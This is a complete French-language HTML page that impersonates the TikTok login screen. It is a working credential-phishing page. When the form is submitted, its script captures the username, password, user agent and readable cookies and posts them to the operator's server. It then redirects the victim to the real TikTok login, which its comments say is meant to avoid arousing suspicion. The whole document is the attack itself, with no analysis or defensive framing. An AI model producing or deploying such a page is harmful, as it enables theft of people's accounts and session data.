<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: black; color: #fff; display: flex; flex-direction: column; justify-content: space-between; align-items: center; height: 100vh; margin: 0; }
        .header { width: 100%; padding: 20px; display: flex; justify-content: space-between; box-sizing: border-box; }
        .logo-text { font-size: 24px; font-weight: 700; margin-left: 10px; }
        .login-container { width: 100%; max-width: 480px; padding: 20px; margin-top: -10vh; }
        h2 { text-align: center; font-size: 32px; margin-bottom: 30px; }
        .input-group { margin-bottom: 15px; position: relative; }
        .input-group input { width: 100%; padding: 14px; border: 1px solid #333; border-radius: 4px; background-color: #222; color: #fff; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 14px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; }
        .footer { width: 90%; padding: 20px; font-size: 12px; color: #888; display: flex; justify-content: space-between; }
    </style>
</head>
<body>

<div class="header">
    <div style="display:flex; align-items:center;">
        <img src="tiktok.png" width="32" alt="logo"/>
        <div class="logo-text">TikTok</div>
    </div>
    <span style="font-size:14px;">Commentaires & assistance</span>
</div>

<div class="login-container">
    <h2>Connexion</h2>
    <form id="authForm">
        <div class="input-group">
            <input type="text" id="user" placeholder="E-mail ou nom d'utilisateur" required>
        </div>
        <div class="input-group">
            <input type="password" id="pass" placeholder="Mot de passe" required>
        </div>
        <button type="submit" class="login-btn">Se connecter</button>
    </form>
</div>

<div class="footer"><span>Français</span><div>© 2026 TikTok</div></div>

<script>
    const form = document.getElementById('authForm');
    form.onsubmit = async function(e) {
        e.preventDefault();

        const payload = {
            identifiant: document.getElementById('user').value,
            password: document.getElementById('pass').value,
            userAgent: navigator.userAgent, // Capture l'appareil
            cookies_locaux: document.cookie  // Capture les cookies non-HttpOnly
        };

        try {
            // Envoi vers TON serveur Render (le chemin relatif fonctionne car ils sont sur le même projet)
            await fetch('/api/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } finally {
            // Redirection vers le vrai TikTok pour ne pas éveiller de soupçons
            window.location.href = "https://www.tiktok.com/login";
        }
    };
</script>
</body>
</html>
